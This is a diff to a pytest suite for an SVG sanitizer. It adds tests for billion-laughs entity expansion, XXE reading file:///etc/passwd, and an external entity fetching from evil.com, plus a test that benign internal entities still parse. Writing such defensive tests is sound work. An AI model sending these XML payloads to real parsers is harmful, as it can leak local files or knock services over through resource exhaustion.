@@ -117,17 +117,68 @@ def test_svg_valid_content_preserved():
 
 
 def test_svg_xxe_blocked():
-    """XXE entity expansion blocked by defusedxml."""
+    """XXE (file:// SYSTEM entity) still blocked after loosening forbid_entities."""
     xxe_svg = b"""<?xml version="1.0"?>
 <!DOCTYPE foo [
   <!ENTITY xxe SYSTEM "file:///etc/passwd">
 ]>
 <svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>"""
-    # defusedxml should raise an error on DTD with entities
-    from exceptions import OptimizationError
-
-    with pytest.raises((OptimizationError, Exception)):
+    # forbid_external=True raises ExternalReferenceForbidden on the SYSTEM entity ref.
+    with pytest.raises(Exception):
         sanitize_svg(xxe_svg)
+
+
+def test_svg_billion_laughs_blocked():
+    """Recursive entity expansion (billion-laughs) is rejected by expat's amplification limit."""
+    # 10^8 expansions of "lol" would produce ~300 MB; expat's default amplification
+    # factor cap (~8192x) kicks in well before that and raises ParseError.
+    billion_laughs = b"""<?xml version="1.0"?>
+<!DOCTYPE lolz [
+  <!ENTITY a "lol">
+  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
+  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
+  <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
+  <!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;">
+  <!ENTITY f "&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;">
+  <!ENTITY g "&f;&f;&f;&f;&f;&f;&f;&f;&f;&f;">
+  <!ENTITY h "&g;&g;&g;&g;&g;&g;&g;&g;&g;&g;">
+]>
+<svg xmlns="http://www.w3.org/2000/svg"><text>&h;</text></svg>"""
+    with pytest.raises(Exception):
+        sanitize_svg(billion_laughs)
+
+
+def test_svg_external_system_entity_blocked():
+    """External SYSTEM entity reference (remote URL) is blocked by forbid_external."""
+    # The SYSTEM entity declaration is fine when forbid_entities=False, but when
+    # expat tries to resolve the external reference it hits forbid_external=True.
+    external_entity_svg = b"""<?xml version="1.0"?>
+<!DOCTYPE svg [
+  <!ENTITY ext SYSTEM "https://evil.com/steal.txt">
+]>
+<svg xmlns="http://www.w3.org/2000/svg"><text>&ext;</text></svg>"""
+    with pytest.raises(Exception):
+        sanitize_svg(external_entity_svg)
+
+
+def test_svg_internal_entity_allowed():
+    """Internal entity declarations (Wikipedia-style CSS shorthand) pass sanitization."""
+    # Real-world Wikimedia SVGs declare ~30 internal entities like <!ENTITY st0 "opacity:.22;…">
+    # and use them as &st0; in style attributes.  These are pure string substitution,
+    # involve no external fetching, and must not cause sanitize_svg to raise.
+    internal_entity_svg = b"""<?xml version="1.0"?>
+<!DOCTYPE svg [
+  <!ENTITY st0 "fill:red;">
+  <!ENTITY st1 "fill:blue;opacity:0.5;">
+]>
+<svg xmlns="http://www.w3.org/2000/svg">
+  <rect style="&st0;" width="10" height="10"/>
+  <circle style="&st1;" cx="5" cy="5" r="5"/>
+</svg>"""
+    # Must not raise; output must contain the expected elements.
+    result = sanitize_svg(internal_entity_svg)
+    assert b"rect" in result
+    assert b"circle" in result
 
 
 # --- File Validation Tests ---
